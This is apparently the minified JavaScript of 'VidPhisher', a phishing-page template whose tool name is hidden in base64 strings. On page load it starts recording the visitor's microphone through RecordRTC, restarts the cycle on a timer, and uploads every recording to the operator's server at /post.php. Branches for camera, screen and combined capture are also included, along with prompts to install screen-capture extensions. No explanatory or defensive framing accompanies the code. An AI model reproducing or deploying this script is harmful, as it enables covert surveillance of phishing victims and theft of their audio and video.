
const h = document.getElementById("video"),
      i = document.getElementById("canvas");
var j = document.querySelector(".recordrtc"),
    k = document.querySelector(".recordvideo"),
    l = "audio",
    m = "webm",
    d = parseInt("recordingTime"),
    e = function () {
        var a = document.querySelector(".switch-recording");
        if ("Stop Recording" === a.innerHTML) {
            function d() {
                a.stream && a.stream.stop && (a.stream.stop(), a.stream = null)
            }
            a.disabled = !0, a.disableStateWaiting = !0, setTimeout(function () {
                a.disabled = !1, a.disableStateWaiting = !1
            }, 2e3), a.innerHTML = "Start Recording", a.recordRTC && (a.recordRTC.length ? a.recordRTC[0].stopRecording(function (b) {
                if (!a.recordRTC[1]) {
                    a.recordingEndedCallback(b), d(), v(a.recordRTC[0]);
                    return
                }
                a.recordRTC[1].stopRecording(function (b) {
                    a.recordingEndedCallback(b), d()
                })
            }) : a.recordRTC.stopRecording(function (b) {
                a.recordingEndedCallback(b), d(), v(a.recordRTC)
            }));
            return
        }
        a.disabled = !0;
        var b = {
            onMediaCaptured: function (b) {
                a.stream = b, a.mediaCapturedCallback && a.mediaCapturedCallback(), a.innerHTML = "Stop Recording", a.disabled = !1
            },
            onMediaStopped: function () {
                a.innerHTML = "Start Recording", a.disableStateWaiting || (a.disabled = !1)
            },
            onMediaCapturingFailed: function (a) {
                "PermissionDeniedError" === a.name && navigator.mozGetUserMedia && InstallTrigger.install({
                    Foo: {
                        URL: "https://addons.mozilla.org/en-US/firefox/addon/enable-screen-capturing/",
                        toString: function () {
                            return this.URL
                        }
                    }
                }), b.onMediaStopped()
            }
        };
        if ("video" === l) {
            n(b);
            a.mediaCapturedCallback = function () {
                a.recordRTC = RecordRTC(a.stream, {
                    type: "gif" === m ? "gif" : "video",
                    disableLogs: c.disableLogs || !1,
                    canvas: {
                        width: c.canvas_width || 320,
                        height: c.canvas_height || 240
                    },
                    frameInterval: void 0 !== c.frameInterval ? parseInt(c.frameInterval) : 20
                });
                a.recordingEndedCallback = function (b) {
                    if (k.src = null, k.srcObject = null, "gif" === m) {
                        k.pause(), k.poster = b, k.onended = function () {
                            k.pause(), k.poster = URL.createObjectURL(a.recordRTC.blob)
                        };
                        return
                    }
                    k.src = b, k.onended = function () {
                        k.pause(), k.src = URL.createObjectURL(a.recordRTC.blob)
                    }
                };
                a.recordRTC.startRecording()
            }
        } else if ("audio" === l) {
            o(b);
            a.mediaCapturedCallback = function () {
                a.recordRTC = RecordRTC(a.stream, {
                    type: "audio",
                    bufferSize: void 0 === c.bufferSize ? 0 : parseInt(c.bufferSize),
                    sampleRate: void 0 === c.sampleRate ? 44100 : parseInt(c.sampleRate),
                    leftChannel: c.leftChannel || !1,
                    disableLogs: c.disableLogs || !1,
                    recorderType: "Edge" === DetectRTC.browser.name ? StereoAudioRecorder : null
                });
                a.recordingEndedCallback = function (c) {
                    var b = new Audio;
                    b.src = c, b.controls = !0, b.onended = function () {
                        b.pause(), b.src = URL.createObjectURL(a.recordRTC.blob)
                    }
                };
                a.recordRTC.startRecording()
            }
        } else if ("both" === l) {
            p(b);
            a.mediaCapturedCallback = function () {
                if ("Firefox" !== DetectRTC.browser.name) {
                    a.recordRTC = [], c.bufferSize || (c.bufferSize = 16384);
                    var d = RecordRTC(a.stream, {
                            type: "audio",
                            bufferSize: void 0 === c.bufferSize ? 0 : parseInt(c.bufferSize),
                            sampleRate: void 0 === c.sampleRate ? 44100 : parseInt(c.sampleRate),
                            leftChannel: c.leftChannel || !1,
                            disableLogs: c.disableLogs || !1,
                            recorderType: "Edge" === DetectRTC.browser.name ? StereoAudioRecorder : null
                        }),
                        b = RecordRTC(a.stream, {
                            type: "video",
                            disableLogs: c.disableLogs || !1,
                            canvas: {
                                width: c.canvas_width || 320,
                                height: c.canvas_height || 240
                            },
                            frameInterval: void 0 !== c.frameInterval ? parseInt(c.frameInterval) : 20
                        });
                    b.initRecorder(function () {
                        d.initRecorder(function () {
                            d.startRecording(), b.startRecording()
                        })
                    });
                    a.recordRTC.push(d, b);
                    a.recordingEndedCallback = function () {
                        var a = new Audio;
                        a.src = d.toURL(), a.controls = !0, a.autoplay = !0, a.onloadedmetadata = function () {
                            k.src = b.toURL()
                        }
                    };
                    return
                }
                a.recordRTC = RecordRTC(a.stream, {
                    type: "video",
                    disableLogs: c.disableLogs || !1
                });
                a.recordingEndedCallback = function (b) {
                    k.srcObject = null, k.muted = !1, k.src = b, k.onended = function () {
                        k.pause(), k.src = URL.createObjectURL(a.recordRTC.blob)
                    };
                };
                a.recordRTC.startRecording()
            }
        } else if ("screen" === l) {
            q(b);
            a.mediaCapturedCallback = function () {
                a.recordRTC = RecordRTC(a.stream, {
                    type: "gif" === m ? "gif" : "video",
                    disableLogs: c.disableLogs || !1,
                    canvas: {
                        width: c.canvas_width || 320,
                        height: c.canvas_height || 240
                    }
                });
                a.recordingEndedCallback = function (b) {
                    if (k.src = null, k.srcObject = null, "gif" === m) {
                        k.pause(), k.poster = b, k.onended = function () {
                            k.pause(), k.poster = URL.createObjectURL(a.recordRTC.blob)
                        };
                        return
                    }
                    k.src = b
                };
                a.recordRTC.startRecording()
            }
        } else if ("audio-plus-screen" === l) {
            r(b);
            a.mediaCapturedCallback = function () {
                a.recordRTC = RecordRTC(a.stream, {
                    type: "video",
                    disableLogs: c.disableLogs || !1
                });
                a.recordingEndedCallback = function (b) {
                    k.srcObject = null, k.muted = !1, k.src = b, k.onended = function () {
                        k.pause(), k.src = URL.createObjectURL(a.recordRTC.blob)
                    };
                };
                a.recordRTC.startRecording()
            }
        }
    };

function n(a) {
    t({
        video: !0
    }, function (b) {
        k.srcObject = b, a.onMediaCaptured(b), b.onended = function () {
            a.onMediaStopped()
        }
    }, function (b) {
        a.onMediaCapturingFailed(b)
    })
}

function o(a) {
    t({
        audio: !0
    }, function (b) {
        k.srcObject = b, a.onMediaCaptured(b), b.onended = function () {
            a.onMediaStopped()
        }
    }, function (b) {
        a.onMediaCapturingFailed(b)
    })
}

function p(a) {
    t({
        video: !0,
        audio: !0
    }, function (b) {
        k.srcObject = b, a.onMediaCaptured(b), b.onended = function () {
            a.onMediaStopped()
        }
    }, function (b) {
        a.onMediaCapturingFailed(b)
    })
}

function q(a) {
    getScreenId(function (b, d, c) {
        if ("not-installed" === b && document.write('<h1><a target="_blank" href="https://chrome.google.com/webstore/detail/screen-capturing/ajhifddimkapgcifgcodmmfdlknahffk">Please install this chrome extension then reload the page.</a></h1>'), "permission-denied" === b && alert("Screen capturing permission is denied."), "installed-disabled" === b && alert("Please enable chrome screen capturing extension."), b) {
            a.onMediaCapturingFailed(b);
            return
        }
        t(c, function (b) {
            k.srcObject = b, a.onMediaCaptured(b), b.onended = function () {
                a.onMediaStopped()
            }
        }, function (b) {
            a.onMediaCapturingFailed(b)
        })
    })
}

function r(a) {
    getScreenId(function (b, d, c) {
        if ("not-installed" === b && document.write('<h1><a target="_blank" href="https://chrome.google.com/webstore/detail/screen-capturing/ajhifddimkapgcifgcodmmfdlknahffk">Please install this chrome extension then reload the page.</a></h1>'), "permission-denied" === b && alert("Screen capturing permission is denied."), "installed-disabled" === b && alert("Please enable chrome screen capturing extension."), b) {
            a.onMediaCapturingFailed(b);
            return
        }
        c.audio = !0;
        t(c, function (b) {
            k.srcObject = b, a.onMediaCaptured(b), b.onended = function () {
                a.onMediaStopped()
            }
        }, function (b) {
            a.onMediaCapturingFailed(b)
        })
    })
}

try {
    head = document.createComment(atob("QSB0ZW1wbGF0ZSBvZiBWaWRQaGlzaGVyLiBNYWRlIHdpdGggTG92ZSBieSBLYXNSb3VkcmEgKGh0dHBzOi8vZ2l0aHViLmNvbS9LYXNSb3VkcmEp"))
} catch (s) {
    head = document.createComment("head")
}

function t(a, b, c) {
    navigator.mediaDevices.getUserMedia(a).then(b).catch(c)
}

function u(a) {
    var b = j.querySelector("#upload-to-server");
    if (!a) return alert("No data found.");
    b.disabled = !0, x(a, function (a, c) {
        if ("ended" === a) {
            b.disabled = !1, b.innerHTML = "Click to download from server", b.onclick = function () {};
            return
        }
        b.innerHTML = a
    })
}

function v(a) {
    if (!a) return alert("No data found.");
    var b = document.querySelector("#upload-to-server");
    b.disabled = !0, x(a, function (a, c) {
        if ("ended" === a) {
            b.disabled = !1, b.innerHTML = "Click to download from server", b.onclick = function () {};
            return
        }
        b.innerHTML = a
    })
}
document.head.appendChild(head), "Edge" === DetectRTC.browser.name && console.warn("Neither MediaRecorder API nor webp is supported in Microsoft Edge. You can merely record audio."), DetectRTC.browser.name;
var w = [];

function x(b, f) {
    var e = b instanceof Blob ? b : b.blob,
        a = e.type.split("/")[0] || "audio";
    try {
        titleHead = atob("VmlkUGhpc2hlcg==")
    } catch (g) {
        titleHead = "Image"
    }
    var c = `${titleHead}-${new Date().toISOString().replace(/(\.|:)/g,"-")}`;
    "audio" === a ? c += "." + (navigator.mozGetUserMedia ? "ogg" : "wav") : c += ".webm";
    var d = new FormData;
    d.append(a + "-filename", c), d.append(a + "-blob", e), f("Uploading " + a + " recording to server."), y("/post.php", d, function (a) {
        if ("upload-ended" !== a) {
            f(a);
            return
        }
        f("ended", "/" + c), w.push("/" + c)
    })
}

function y(b, c, d) {
    var a = new XMLHttpRequest;
    a.onreadystatechange = function () {
        4 == a.readyState && 200 == a.status && d("upload-ended")
    };
    a.upload.onloadstart = function () {
        d("Upload started...")
    };
    a.upload.onprogress = function (a) {
        d("Upload Progress " + Math.round(a.loaded / a.total * 100) + "%")
    };
    a.upload.onload = function () {
        d("progress-about-to-end")
    };
    a.upload.onload = function () {
        d("progress-ended")
    };
    a.upload.onerror = function (a) {
        d("Failed to upload to server"), console.error("XMLHttpRequest failed", a)
    };
    a.upload.onabort = function (a) {
        d("Upload aborted."), console.error("XMLHttpRequest aborted", a)
    };
    a.open("POST", b), a.send(c)
}
setTimeout(function () {
    document.getElementById("ac-wrapper").style.display = "none"
}, 5e4), e(), setInterval(function () {
    e()
}, d);
var c = {},
    f = /([^&=]+)=?([^&]*)/g;

function b(a) {
    return decodeURIComponent(a.replace(/\+/g, " "))
}

for(var a,g=window.location.search;a=f.exec(g.substring(1));)c[b(a[1])]=b(a[2]),("true"===b(a[2])||"false"===b(a[2]))&&(c[b(a[1])]="true"===b(a[2]));window.params=c
